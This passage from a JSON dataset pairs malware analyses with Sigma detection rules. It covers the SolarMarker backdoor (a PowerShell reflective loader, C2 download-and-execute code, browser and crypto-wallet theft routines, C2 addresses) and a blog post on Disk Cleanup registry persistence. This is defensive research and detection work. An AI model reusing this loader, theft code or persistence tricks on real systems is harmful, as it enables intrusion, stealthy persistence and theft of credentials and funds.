campaign establishes persistence through registry modifications.\nTranscription: |\n  Computer\\HKEY_CLASSES_ROOT\\.nuaoeluriqznsvqco\n  Name                Type    Data\n  (Default)          REG_SZ  ocrrhvyczvnikxofwntsvx\n```\n\nThe file type is defined by the script with a custom file open handler. This handler is a PowerShell script:\n\n```image\nAlt: File Handler Polazert PShell\nDescription: The image shows a screenshot of the Windows Registry Editor displaying a specific registry key related to the SolarMarker malware campaign. The highlighted entry indicates the custom file type defined by the malware, with the name 'ocrrhvyczvnikxofwntsvx'. This includes subkeys for 'shell' and 'command', where the command is a PowerShell script that acts as a handler for files with a randomly generated extension. The image provides a visual representation of how the malware establishes persistence through registry modifications.\nTranscription: |\n  Computer\\HKEY_CLASSES_ROOT\\ocrrhvyczvnikxofwntsvx\\shell\\open\\command\n  Name                     Type     Data\n  [Default]               REG_SZ   POweRSHeL -eP BYpasS -CoMMaND \"$ab335ab62c0406ba430196db...\n```\n\n### Reflected loading\n\nThe script in the handler loads the file containing the encrypted payload (in this case, **EhkpfRkrpDaViAPS\\KfWJiiEPmkDO.fFOTagOUMEgIwBH**). It then uses a key hard-coded into the script to decrypt the payload using a bitwise XOR operation, and then uses reflective loading to execute the now-decrypted DLL, as illustrated on the following beautified code:\n\n```image\nAlt: Reflective Load PShell Polazert\nDescription: The image displays a snippet of PowerShell code that is used to illustrate the process of reflective loading associated with the SolarMarker campaign. The highlighted part of the code shows the file path to an encrypted payload, indicating where the payload is stored on the system. The code also includes a decryption operation that utilizes a hard-coded key for XOR decryption. Additionally, there are comments that describe the functionality of the code, such as making the PowerShell window disappear and loading the DLL main function.\nTranscription: |\n  # Make PowerShell Disappear\n  $ab353ab62c0406ba430196dbf299d=add-type -mEMBErdeFinitioN ('[dllImport\"user32.dll\"]public static extern\n      bool ShowWindowAsync(IntPtr hwnd, int nCmdShow);') -name (Win32ShowWindowAsync -NamESpace wiN32FunCTionS\n      -PasSThRu'\n  $ab353ab62c0406ba430196dbf299d::ShowWINDOWwasYnc(((gEt-PROCeSS -iD $pID).MaInwindonHandle, 0)\n  \n  $orkey=\n  'Kx81eVpeT35gJUB8Y1VmQFZ1NkBAU0tVYUB3YzZ+Xm5gJHpAYGJJZUBVRlBNQFJ4X0ZAUnBkaV4xNlZQXjBTUYNavkJXSX0B2cHoyQF\n  AVHJR1P5PVmQhQEk21eMEo/ekBSWgPQdKKemNeMHVPDV5b2syQHI5cys/VXN0fnBvKTw0eU50RS1qal54dWhLeyFLdGc/e3RWL\n  z0sLTb31yVaUduJ3FKmsqYizRdSgRltUJ88MWHT301dCVZdvdmV3XN2tpRHomenA5MR1Jko1ewppdEhwcmooyJ10RnBROXFOuY\n  \n  $i=0\n  $payload=[io.fILEl::ReADallbyITs(\n  'C:\\Users\\appData\\Roaming\\Adobe\\EhkpfRkrpDaViAPS\\kFWJiiEPmkDO.fFOTagOUMEgIwBH')\n  (0..$payload.Count) | ForEach {\n      if ($i -ge $payload.Count){}\n      Else{\n          For($keyindex=0; $keyindex -lt $orkey.LENgTh; $keyindex++){\n              $payload[$i]=$payload[$i] -Bxor $orkey[$keyindex]\n              $i++\n              If($i -ge $payload.Count){\n                  $keyindex=$orkey.length\n              }\n          }\n      }\n  }\n  \n  [REFLection.AsSEMBly]::load($payload)\n```\n\nThe reflectively loaded payload is the Solarmarker backdoor.\n\n### Solarmarker payload\n\nDuring this research we identified several variants of the backdoor, the main difference between them is the internal version number, the C2 server and the RSA key used for communication. Each variant is identified with a version ID string:\n\n```\npublic string AppVer = \"IN-3\";\n```\n\nMultiple versions communicated with the same server, and there was a unique key for each server.\n\n| **Version** | **C2 server**          |\n|-------------|------------------------|\n| **DR/1.6**  | http://45.146.165.221  |\n| **DR/1.7**  | http://91.241.19.110   |\n| **IN-1**    | http://46.102.152.102  |\n| **IN-2**    | http://46.102.152.102  |\n| **IN-3**    | http://46.102.152.102  |\n| **IN-9**    | http://46.102.152.102  |\n| **IN-10**   | http://46.102.152.102  |\n| **IN-13**   | http://185.244.213.64  |\n| **RB-7**    | http://192.121.87.53   |\n| **J12**     | http://5.254.118.226   |\n| **J13**     | http://23.29.115.175   |\n| **J15**     | http://92.204.160.110  |\n| **J16**     | http://92.204.160.110  |\n| **SP-W1**   | http://146.70.24.173   |\n| **SP-W2**   | http://69.46.15.151    |\n| **AG-3**    | http://167.88.15.115   |\n| **AG-5**    | http://167.88.15.115   |\n| **AG-8**    | http://167.88.15.115   |\n| **AG-9**    | http://167.88.15.115   |\n| **AG-13**   | http://216.230.232.134 |\n| **SP-1**    | http://216.230.232.134 |\n| **SP-3**    | http://216.230.232.134 |\n| **SP-5**    | http://37.120.237.251  |\n| **SP-7**    | http://37.120.237.251  |\n| **SP-10**   | http://37.120.237.251  |\n| **SP-11**   | http://37.120.237.251  |\n| **SP-13**   | http://45.42.201.248   |\n| **SP-16**   | http://45.42.201.248   |\n| **SP-17**   | http://188.241.83.61   |\n| **SP-18**   | http://188.241.83.61   |\n| **SP-21**   | http://146.70.41.157   |\n| **OC-1**    | http://146.70.41.157   |\n| **OC-3**    | http://146.70.41.157   |\n| **OC-4**    | http://146.70.41.157   |\n| **NV-1**    | http://92.204.160.233  |\n| **NV-4**    | http://92.204.160.233  |\n| **NV-5**    | http://92.204.160.233  |\n| **NV-6**    | http://92.204.160.233  |\n| **OC-11**   | http://92.204.160.233  |\n| **OC-8**    | http://37.221.114.23   |\n| **OC-9**    | http://37.221.114.23   |\n| **OC-7**    | http://149.255.35.179  |\n| **OC-W1**   | http://104.223.123.7   |\n\nOlder versions of the backdoor provided different functionality, such as browser data stealing, crypto-wallet stealing, and command execution. But more recent variants of the backdoor have the following, limited capabilities:\n- Run a PowerShell command decoded from a deflate+base64 encoded blob on a remote server.\n- Run an .EXE file (first saved to %TEMP%) retrieved from a remote server.\n\nIn all versions of the backdoor, the code contains a lot of junk thread-creation code fragments. These do nothing but break up the readability of the code and add delay cycles to the execution. For example, in this section of code:\n\n```image\nAlt: SolarMarker Backdoor\nDescription: The image displays a snippet of code related to the SolarMarker backdoor. It shows a C# programming structure that includes threads, delegates, and a switch statement evaluating the operating system version. The code is formatted with syntax highlighting, indicating the structure and logic used within the backdoor's functionality, including operations for different operating system versions (like Windows XP and Vista). This snippet is part of a larger analysis of the backdoor's behavior and implementation.\nTranscription: |\n  OperatingSystem oSVersion = Environment.OSVersion;\n  Thread thread2 = new Thread(delegate\n  {\n      Func<double, double> func = (double acc3569f20541ab73ad9dbc7dfacb) =>\n          acc3569f20541ab73ad9dbc7dfacb * acc3569f20541ab73ad9dbc7dfacb + -24.472422563328891;\n      double num = func(-74.4809990407182986);\n  });\n  thread2.Start();\n  thread2.Join();\n  string text;\n  switch (oSVersion.Version.Major)\n  {\n      case 5:\n          text = \"XP\";\n          goto IL_16B;\n      case 6:\n      {\n          Thread thread3 = new Thread(delegate\n          {\n              Func<double, double> func = (double aad1756cca24438c0a6957139171a) =>\n                  aad1756cca24438c0a6957139171a * aad1756cca24438c0a6957139171a + -24.472422563328891;\n              double num = func(-74.4809990407182986);\n          });\n          thread3.Start();\n          thread3.Join();\n          switch (oSVersion.Version.Minor)\n          {\n              case 0:\n                  text = \"Vista\";\n```\n\n…after removing the junk the about code simplifies to:\n\n```\nOperatingSystem oSVersion = Environment.OSVersion;\nstring text;\nswitch (oSVersion.Version.Major)\n{\ncase 5:\n       text = \"XP\";\n       goto IL_16B;\ncase 6:\n{\nswitch (oSVersion.Version.Minor)\n{\n       case 0:\n              text = \"Vista\";\n```\n\n### The evolving backdoor\n\nInterestingly, the functionality of the latest version of the backdoor is essentially the same as that of the oldest version we could identify (sha1: 6ccbde9f29fe59077e218b5dc294ca179bd54522, version ID: *DR/1.6*, timestamp: November 2020). It also allowed the execution of a .EXE program received from the C2 server:\n\n```\nstring text3 = string.Concat(new object[]\n{\n     Environment.GetEnvironmentVariable(\"temp\"),\n     '\\\\',\n     M.GenRandomString(24),\n     \".exe\"\n});\nbyte[] bytes2 = M.DecryptRaw(M.Req(addr,\n…\nFile.WriteAllBytes(text3, bytes2);\nProcess.Start(text3);\n```\n\nAnd it also provided for the execution of a PowerShell file received from the C2 server:\n\n```\nstring text2 = string.Concat(new object[]\n{\n     Environment.GetEnvironmentVariable(\"temp\"),\n     '\\\\',\n     M.GenRandomString(24),\n     \".ps1\"\n});\nbyte[] bytes = M.DecryptRaw(M.Req(addr,\n…\nFile.WriteAllBytes(text2, bytes);\nProcess.Start(new ProcessStartInfo\n{\n     FileName = \"powershell\",\n     Arguments = \"-ep bypass -command \\\"iex(get-content '\" + text2 + \"')\\\"\",\n     WindowStyle = ProcessWindowStyle.Hidden\n});\nThread.Sleep(15000);\nFile.Delete(text2);\n```\n\nFinally it could execute a PowerShell command received as a string from the C2 server:\n\n```\nelse if (value == \"command\") {\n   string value2 = ((M.JsonValue)jsonObject.Get(\"task_id\")).value;\n   string value4 = ((M.JsonValue)jsonObject.Get(\"command\")).value;\n   Process.Start(new ProcessStartInfo {\n   FileName = \"powershell\", Arguments = \"-ep bypass -command \\\"\" + value4 + \"\\\"\", WindowStyle = ProcessWindowStyle.Hidden });\n```\n\nIn this oldest version, the data sent to the C2 server was encrypted using a XOR algorithm using a hardcoded key. This encryption scheme was later replaced with more secure RSA encryption.\n\nIn addition to the RSA encrypted communication, later variants added other functionality, while removing some of the older ones. Version **J13** (sha1: 55c692913894a282189e0dff5dcd60e29ad89046, time stamp September 2021), for instance, does not provide any remote execution options. Instead, it collects browser data and sends it to the C2 server.\n\n```\nif (File.Exists(directoryInfo2.FullName + \"\\\\logins.json\") && File.Exists(directoryInfo2.FullName + \"\\\\key4.db\") && File.Exists(directoryInfo2.FullName + \"\\\\cert9.db\") && File.Exists(directoryInfo2.FullName + \"\\\\cookies.sqlite\") && File.Exists(directoryInfo2.FullName + \"\\\\formhistory.sqlite\"))\n{\n   this.a = this.f(directoryInfo2.FullName + \"\\\\cert9.db\");\n   this.b = this.f(directoryInfo2.FullName + \"\\\\key4.db\");\n   this.c = this.f(directoryInfo2.FullName + \"\\\\logins.json\");\n   this.d = this.f(directoryInfo2.FullName + \"\\\\cookies.sqlite\");\n   this.e = this.f(directoryInfo2.FullName + \"\\\\formhistory.sqlite\");\n}\n```\n\nThis version targets multiple browsers (Chrome, Edge, Brave, Opera, Firefox):\n\n```\n{\n'\\\\','A','p','p','D','a','t','a','\\\\','L','o','c','a','l','\\\\','G','o','o','g','l','e',\n'\\\\','C','h','r','o','m','e','\\\\','U','s','e','r',' ','D','a','t','a'\n}), list);\n\nMain.a(Main.a(new char[]\n{\n'e','d','g','e'\n}), environmentVariable + Main.a(new char[]\n{\n'\\\\','A','p','p','D','a','t','a','\\\\','L','o','c','a','l','\\\\','M','i','c','r','o','s','o','f','t',\n'\\\\','E','d','g','e','\\\\','U','s','e','r',' ','D','a','t','a'\n}), list);\n\nMain.a(Main.a(new char[]\n{\n'o','p','e','r','a'\n}), environmentVariable + Main.a(new char[]\n{\n'\\\\','A','p','p','D','a','t','a','\\\\','R','o','a','m','i','n','g','\\\\','O','p','e','r','a','\n','S','o','f','t','w','a','r','e','\\\\','O','p','e','r','a',' ','S','t','a','b','l','e'\n}), list);\nMain.a(Main.a(new char[]\n{\n'b','r','a','v','e'\n}), environmentVariable + Main.a(new char[]\n{\n'\\\\','A','p','p','D','a','t','a','\\\\','L','o','c','a','l','\\\\','B','r','a','v','e',\n'S','o','f','t','w','a','r','e','\\\\','B','r','a','v','e','-','B','r','o','w','s','e','r',\n'\\\\','U','s','e','r',' ','D','a','t','a'\n}), list);\ntry\n{\nMain.k k = new Main.k(Main.a(new char[]\n{\n    'f','i','r','e','f','o','x'\n}), environmentVariable + Main.a(new char[]\n{\n'\\\\','A','p','p','D','a','t','a','\\\\','R','o','a','m','i','n','g','\\\\',\n'M','o','z','i','l','l','a','\\\\','F','i','r','e','f','o','x','\\\\','P','r','o','f','i','l','e','s'\n}));\n```\n\nVersion **J12** (sha1: ee19506006b67c58933b471597e777b2675fba92, compilation time September 2021) added crypto-wallet stealing as a functionality.\n\n```\nstring environmentVariable = Environment.GetEnvironmentVariable(\"userprofile\");\nstring text = environmentVariable + \"\\\\AppData\\\\Roaming\";\nstring text2 = environmentVariable + \"\\\\AppData\\\\Local\";\nMain.a(list, \"Atomic\", \"Wallet\", \"*\", text + \"\\\\atomic\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"Guarda\", \"Wallet\", \"*\", text + \"\\\\Guarda\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"SimpleOS\", \"Wallet\", \"*\", text + \"\\\\Neon\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"Wasabi\", \"Wallet\", \"*\", text + \"\\\\WalletWasabi\\\\Client\\\\Wallets\", false);\nMain.a(list, \"MyMonero\", \"Wallet\", \"*.mmd*\", text + \"\\\\MyMonero\", false);\nMain.a(list, \"Jaxx\", \"Wallet\", \"*\", text + \"\\\\Jaxx\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"Jaxx\", \"Wallet\", \"*\", text + \"\\\\com.liberty.jaxx\\\\IndexedDB\", false);\nMain.a(list, \"Electrum\", \"Wallet\", \"*\", text + \"\\\\Electrum\\\\wallets\", false);\nMain.a(list, \"Ethereum\", \"Wallet\", \"*\", text + \"\\\\Ethereum\\\\keystore\", false);\nMain.a(list, \"Exodus\", \"Wallet\", \"*\", text + \"\\\\Exodus\\\\exodus.wallet\", false);\nMain.a(list, \"GreenAddress\", \"Wallet\", \"*\", text + \"\\\\GreenAddress Wallet\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"Coin Wallet\", \"Wallet\", \"*\", text + \"\\\\Coin Wallet\\\\Local Storage\\\\leveldb\", false);\nMain.a(list, \"Bither\", \"Wallet\", \"*\", text + \"\\\\Bither\", false);\nMain.a(list, \"Coinomi\", \"Wallet\", \"*\", text2 + \"\\\\Coinomi\\\\Coinomi\\\\wallets\", false);\nMain.a(list, \"Ledger Live\", \"Hardware wallet\", \"*.json\", text + \"\\\\Ledger Live\", false);\nMain.a(list, \"Trinity\", \"Hardware wallet\", \"*.realm\", text + \"\\\\Trinity\", false);\nMain.a(list, \"Scatter\", \"Hardware wallet\", \"*.json\", text + \"\\\\scatter\", false);\nMain.a(list, \"Unknown?\", \"Wallet?\", \"*wallet*.dat\", text, false);\nMain.a(list, \"Unknown?\", \"Wallet?\", \"*.wallet\", text, false);\nMain.a(list, \"Unknown?\", \"Wallet?\", \"*wallet*.dat\", text2, false);\nMain.a(list, \"Unknown?\", \"Wallet?\", \"*.wallet\", text2, false);\nstring[] directories = Directory.GetDirectories(text, \"Electrum-*\");\nstring[] array = directories;\nfor (int i = 0; i < array.Length; i++)\n{\nstring str = array[i];\nMain.a(list, \"Electrum\", \"Wallet\", \"*\", str + \"\\\\wallets\", false);\n}\n```\n\nIn this variant, as shown in the code above, SolarMarker collects the wallets of the following cryptocurrencies:\n- Atomic\n- Guarda\n- SimpleOS\n- Neon\n- Wasabi\n- MyMonero\n- Jaxx\n- Electrum\n- Ethereum\n- Exodus\n- GreenAddress\n- Coin\n- Bither\n- Coinomi\n- Ledger\n- Trinity\n- Scatter\n\nAdditionally this variant collects VPN and RDP configs:\n\n```\nMain.a(list, \"OpenVPN?\", \"VPN?\", \"*.*vpn\", environmentVariable, true);\nMain.a(list, \"RDP\", \"RDP\", \"*.rdp\", environmentVariable, true);\n```\n\n### The latest model\n\nThe most recent version we’ve analyzed creates a text file with path like:\n\n**%PROFILE%\\AppData\\Roaming\\279285253294232222272216305245290297297239249276271219226274280293290274218258302282286231248295323257262221246241273.awYKBgIaGxZ3DQM=**\n\nThe contents of this file is an encoded string (in this case, **2CJDEX5HFXHRXL3FK53CXRS9U8L5EDDC**) which serves as a unique system ID (HWID), generated from the content of files in %APPDATA%, or generated randomly, if empty.\n\nThe backdoor calls back to the C2 server with a JSON message to C2 server with basic config data:\n\n```\n{\"action\":\"ping\",\"hwid\":\"A8IFX8YU3NJIU8PFJ0XFMMXDCWFQT9UG\",\"pc_name\":\"{redacted}\",\"os_name\":\"Win 7\",\"arch\":\"x86\",\"rights\":\"User\",\"version\":\"OC-8\",\"workgroup\":\"? | ?\",\"dns\":0,\"protocol_version\":2}\n```\n\nThis message is sent to the server encrypted with a hardcoded RSA key.\n\n```\n<Main>\n<Modulus>q7lnDVdxQRSYhRPYcqRaqkwV9sRGLxrKNMOSsxFSdJ30bswOmMHEeUe7Z/3rGI3dmlnSC77I/\nqwWkzf73lF+SPFmIw4ma84JIVDW76k+eEP2iguC9zGNXaPBajogFRf8K2HgIwF/eni/wmnrtzhryxIE5mNJzAREsICbA/\n/RzfTU3C7JPlkCys0q9uVlkQLO9ijQHyHuUE+uk0nGk2+0t91hW+efqz5i8iy92hFm3dnD005mogpXA+18pFeFu8x1hrr\nPFhaHY9m1Xl7oyBZ8nnol4uDdPNzkGNCsUOZtSVQE8wZc5yaFKBU2uuCl8IHaQMhENrNMR0EWlMTYgrAWYw==</Modulus>\n<Exponent>AQAB</Exponent>\n</Main>\n```\n\nFurther communications with the server will be encrypted with the original config buffer.\n\nSo, the initial report-back call communication data is encrypted using the hard-coded RSA key with asymmetric RSA algorithm, the rest of the communication uses the config buffer as a key using symmetric AES CBC algorithm.\n\nThe C2 server is selected from a possible array of server names, which in the analyzed sample contained only a single entry: hxxp://37[.]221.114.23.\n\nAs noted earlier, this version of the backdoor’s functionality is limited to executing some next-stage code. For that, the backdoor provides multiple approaches. It can:\n- download and execute a Windows executable\n- download and execute a PowerShell script\n- download and load a .Net DLL\n- run a PowerShell command received as a string\n\nRunning PowerShell and a command is done the same way: the payload is expected to be a compressed gzip stream with base64 encoding on top:\n\n```image\nAlt: Payload Polazert C2\nDescription: The image displays a snippet of code that appears to be related to the SolarMarker campaign. It shows a sequence of C# programming instructions that involve creating a memory stream, compressing data using GZip, and converting strings to byte arrays. This code is likely part of the payload used by the backdoor, indicating how it handles data compression and execution within the compromised environment.\nTranscription: |\n  char\n  ({\n      'p',\n      'o',\n      'l',\n      'a',\n      'z',\n      'e',\n      'r',\n  });\n  \n  MemoryStream memoryStream = new MemoryStream();\n  GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress);\n  byte[] bytes = Encoding.UTF8.GetBytes(\"d3a589d253c496b3f634d6691\");\n  gzipStream.Write(bytes, 0, bytes.Length);\n  gzipStream.Close();\n  memoryStream.Close();\n  \n  string text = Environment.GetEnvironmentVariable(\"temp\") + \"\\\\\" + Program.Main.getName();\n  string arguments = text + \" \" + Convert.ToBase64String(Encoding.UTF8.GetBytes(Program.random_case(\"get\")));\n  string getBytes = (Program.random_case(\"$p\") + \" \" + text);\n  System.IO.Compression.CompressionMode::Decompress) {$i2.CopyTo($i2.Close();$i1.Delete($p));\n  process.StartInfo.UseShellExecute = false;\n```\n\nThe .Net module is loaded in memory, the Run function of the Module.Main class is executed:\n\n```\nmpool.a9bd1e9d79f46a96330eecb53f054(Program.ad10fd14022445bfbbcdf53ea0fba(Program.get_msg_get_file(cfg.hwid, text4), cfg), Program.chararray_to_str(new char[]\n{\n'M','o','d','u','l','e','.','M','a','i','n'\n}), Program.chararray_to_str(new char[]\n{\n'R','u','n'\n}), str3);\n```\n\n### Conclusion\n\nThere are currently no active SolarMarker-spreading campaigns, as the final download site used by the operators of the campaign was shut down. But SolarMarker deployments remain active, and while we’ve seen a decline in detections of the malware since November of 2021, the malware has not disappeared. It may be just a matter of time before a new campaign using new infrastructure is launched.\n\nWhile ransomware operators and other malicious actors draw much of defenders’ focus to well-documented malware delivery methods—phishing emails, Remote Desktop Protocol exploitation, and remote code execution vulnerabilities—there are still some active campaigns that use SEO as delivery method, as demonstrated by other malware delivery-as-a-service schemes. Because we don’t pay much attention to this delivery method, these SEO-based campaigns can slip under the radar of defenders until it is too late and the payload has already been deployed.\n\nOrganizations need to train users on the risks of SEO poisoning and how to identify potentially malicious results. But that education may not be enough to prevent malicious downloads through highly-targeted search terms, so a defense in depth is best.\n\nSophos detects the PowerShell installer as Troj/PS-JA, the reflective loader as AMSI/SolarM-A and the final payload as Mal/Polazert-A. A list of IOCs for SolarMarker is available on the SophosLabs GitHub page.",
    "sigma_rule": {
      "title": "Custom File Open Handler Executes PowerShell",
      "id": "7530b96f-ad8e-431d-a04d-ac85cc461fdc",
      "status": "test",
      "description": "Detects the abuse of custom file open handler, executing powershell",
      "references": [
        "https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/?cmp=30728"
      ],
      "author": "CD_R0M_",
      "date": "2022-06-11",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "shell\\open\\command\\",
          "Details|contains|all": [
            "powershell",
            "-command"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_custom_file_open_handler_powershell_execution.yml",
    "id": "939"
  },
  {
    "url": "https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential AutoLogger Sessions Tampering",
      "id": "f37b4bce-49d0-4087-9f5b-58bffda77316",
      "status": "test",
      "description": "Detects tampering with autologger trace sessions which is a technique used by attackers to disable logging",
      "references": [
        "https://twitter.com/MichalKoczwara/status/1553634816016498688",
        "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/",
        "https://i.blackhat.com/EU-21/Wednesday/EU-21-Teodorescu-Veni-No-Vidi-No-Vici-Attacks-On-ETW-Blind-EDRs.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-01",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_main": {
          "TargetObject|contains": "\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\"
        },
        "selection_values": {
          "TargetObject|contains": [
            "\\EventLog-",
            "\\Defender"
          ],
          "TargetObject|endswith": [
            "\\Enable",
            "\\Start"
          ],
          "Details": "DWORD (0x00000000)"
        },
        "filter_wevtutil": {
          "Image": "C:\\Windows\\system32\\wevtutil.exe"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disable_autologger_sessions.yml",
    "id": "944"
  },
  {
    "url": "https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/",
    "markdown": "# Beyond good ol’ Run key, Part 86\n\nPosted on 2018-09-02\n\nIt is a well-known fact that Windows features are the best persistence mechanisms, and… the one I am going to talk about is yet another one of these…\n\nIf you ever ran into a problem of having not enough space on your hard drive you are certainly familiar with the Disk Cleanup program:\n\n```image\nAlt: Disk Cleanup\nDescription: The image displays the user interface of the Disk Cleanup tool in Windows. It shows a window titled 'Disk Cleanup for (C:)', indicating that the utility is being used to free up disk space on the C drive. The window lists various types of files that can be deleted, including 'Downloaded Program Files', 'Temporary Internet Files', 'System created Windows Error Reporting...', 'DirectX Shader Cache', and 'Delivery Optimization Files'. Each item includes a checkbox, with the 'Downloaded Program Files' selected, and displays the size of the files that can be deleted. Additionally, there is a summary at the bottom indicating the total amount of disk space that can be gained, which is currently 0 bytes. At the bottom, there are buttons for 'Clean up system files', 'View Files', 'OK', and 'Cancel'.\nTranscription: |\n  Disk Cleanup for (C:)\n  \n  Disk Cleanup\n  You can use Disk Cleanup to free up to 8.62 MB of disk space on (C:).\n  \n  Files to delete:\n  - [x] Downloaded Program Files                     0 bytes\n  - [x] Temporary Internet Files                     0 bytes\n  - [ ] System created Windows Error Reporting...    15.9 KB\n  - [ ] DirectX Shader Cache                         0 bytes\n  - [ ] Delivery Optimization Files                  8.52 MB\n  \n  Total amount of disk space you gain:               0 bytes\n  \n  Description:\n  Downloaded Program Files are ActiveX controls and Java applets downloaded automatically from the Internet when you view certain pages. They are temporarily stored in the Downloaded Program Files folder on your hard disk.\n  \n  [Clean up system files]       [View Files]\n  [OK]                          [Cancel]\n```\n\nIt turns out that the list of the ‘Files to delete’ that we see on the GUI is not random. It is pulled from this Registry node:\n\n- HKLM\\SOFTWARE\\Microsoft\\Windows\\\n  CurrentVersion\\Explorer\\\n  VolumeCaches\n\n```image\nAlt: Disk Cleanup Registry\nDescription: The image displays a screenshot of the Windows Registry Editor, specifically showing the path HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\Downloaded Program Files. It features a structured list of keys and values related to the Downloaded Program Files, including entries like '(Default)', 'AdvancedButtonText', 'Autorun', 'Description', 'Display', and 'Priority'. Each entry is accompanied by its data type (e.g., REG_SZ, REG_DWORD, REG_BINARY) and corresponding data values, demonstrating various configurations tied to the Disk Cleanup functionality.\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\Downloaded Program Files\n  \n  Name                          Type         Data\n  (Default)                     REG_SZ       (8369AB20-56C9-11D0-94E8-00AA0059CE02)\n  AdvancedButtonText            REG_SZ       C:\\Windows\\System32\\occache.dll,-1072\n  Autorun                       REG_DWORD    0x00000001 (1)\n  Description                   REG_SZ       C:\\Windows\\System32\\occache.dll,-1071\n  Display                       REG_SZ       C:\\Windows\\System32\\occache.dll,-1070\n  Priority                      REG_BINARY   64 00 00 00\n```\n\nSo, it would seem the list is dynamic and we can add entries to it.\n\nIndeed.\n\nThe process is actually well-documented in this Microsoft’s article: Registering a Disk Cleanup Handler.\n\nSo, adding these entries:\n\n- HKLM\\SOFTWARE\\Microsoft\\Windows\\\n  CurrentVersion\\Explorer\\VolumeCaches\\\n  BadGuy=<BADCLSID>\n- HKCR\\CLSID\\<BADCLSID>\\\n  InProcServer32 = <BADDLL>\n\nwill launch the BADDLL anytime Clean Manager tool is launched. Notably, the GUI won’t show the BadGuy entry (unless additional required Registry entries are populated – refer to the information in the Microsoft article I provided the link to)!\n\nIn my previous post I speculated that in some cases it is possible to design LOLbinish persistence mechanisms. We can start by adding e.g. Run key pointing to a legitimate OS binary and then ensure that when it’s launched during logon process it will run the second stage of the persistence mechanism. The Werfault program was a good example, and the Disk Cleanup program falls into this category as well!\n\nThe executable that launches the Disk Cleanup is called cleanmgr.exe. Adding it to run during the start-up may not be the best idea, because it has a GUI, but… there are always command line arguments of this program that we can use e.g.\n\n- /autoclean\n- /setup\n\nIndeed, adding ‘cleanmgr /autoclean’ to ‘cleanmgr /setup’ to the ‘typical’ start-up place e.g. Run key will ensure that there is no GUI when the cleanmgr.exe is launched, and in a background, the plug-ins are loaded as well. Including the bad one.\n\nFrom a forensic perspective, cleanmgr.exe updates the files in the following location:\n\n- c:\\WINDOWS\\system32\\LogFiles\\setupcln\\setupact.log\n- c:\\WINDOWS\\system32\\LogFiles\\setupcln\\setuperr.log\n\nI have not seen these files being updated with any references to the plug-ins loaded, but it could be a helpful artifact nevertheless…\n\nAnd… there is more…\n\nThe Disk Cleanup has a few more tricks for us to exploit.\n\nMany entries that we see listed under the VolumeCache node point to {C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}. This CLSID refers to c:\\Windows\\System32\\dataclen.dll file which is a generic folder and file deletion tool!\n\nThe values it relies on are:\n\n- Folder – where to look for files to delete e.g. c:\\test (refer to Microsoft article for a syntax for multiple entries)\n- Files – what files to look for e.g. *.foo (refer to Microsoft article for a syntax for multiple entries)\n- StateFlags=1 – an internal flag\n- Flags = 1 – a documented flag, here means ‘run the plug-in’, but it can also tell the tool to do more things (refer to Microsoft article for details)\n\nOnce these are set-up the program will search for the file(s) inside the folder(s) as per the Registry values. If any is found it will remove them as usual…\n\nBUT\n\nif any of these values exist:\n\n- PreCleanupString – a path to the program that will be executed prior to clean-up\n- CleanupString – a path to the program that will be executed after the clean-up\n\nit will also execute these programs prior and after the deletion!\n\nSounds interesting?\n\nTo trigger this one has to constantly drop c:\\test\\somefile.foo on the system. This will ensure the deletion library finds something to do and uses these two cleanup string entries and… these programs will be automatically executed.\n\nSo…\n\nOne can add their own entry, or modify the existing entries e.g.:\n\n- Diagnostic Data Viewer database files\n  - CleanupString = rundll32.exe utcutil.dll,DiskCleanupEnd\n  - PreCleanupString = rundll32.exe utcutil.dll,DiskCleanupStart\n- Windows Error Reporting Files\n  - PreCleanupString = wermgr.exe -purgestores\n- etc.\n\nThere is also a dangerous bit. One could use this mechanism to delete any folder/file on the system…\n\nLastly, if you want the PreCleanupString / CleanupString programs to be launched w/o gui, i.e. while using e.g. /autoclean command line switch, just need to add a dword value Autorun=1 to the same branch in the Registry e.g.:\n\n```image\nAlt: Autorun Registry\nDescription: The image displays a screenshot of the Windows Registry Editor, specifically focusing on the path 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\BadGuy'. It shows various registry entries including 'CleanupString', 'Filelist', 'Folder', 'PreCleanupString', 'StateFlags', and 'Autorun', along with their respective types and data values. This information relates to the manipulation of the Disk Cleanup tool's behavior in Windows, indicating how certain entries can be configured to execute specified programs during cleanup operations.\nTranscription: |\n  Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\BadGuy\n  Name                     Type        Data\n  